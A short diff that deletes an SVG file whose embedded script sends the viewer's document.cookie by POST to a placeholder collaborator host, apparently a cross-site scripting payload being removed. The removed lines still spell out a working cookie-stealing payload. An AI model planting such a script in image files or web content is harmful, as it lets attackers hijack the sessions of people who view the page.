@@ -1,3 +1,0 @@
-<svg xmlns="http://www.w3.org/2000/svg">
-<script>fetch('https://[COLLABORATOR]',{method:'POST',mode:'no-cors',body:document.cookie});</script>
-</svg>
